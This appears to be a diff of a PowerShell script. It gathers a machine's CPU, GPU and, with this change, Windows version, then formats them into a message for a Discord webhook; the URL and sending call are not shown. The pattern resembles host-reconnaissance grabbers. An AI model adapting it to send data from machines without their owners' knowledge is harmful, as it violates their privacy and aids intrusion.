@@ -17,6 +17,8 @@ $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manu
 # Retrieve GPU information
 $gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion
 
+$osVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+
 sleep 2
 
 # Define the Discord webhook URL
@@ -31,6 +33,7 @@ $payload = @{
 **GPU:** $($gpu.Name)
 **CPU:** $($cpu.Name)
 **CPU Cores:** $($cpu.NumberOfCores)
+**OS:** $osVersion
 ================================
 "@
 } | ConvertTo-Json
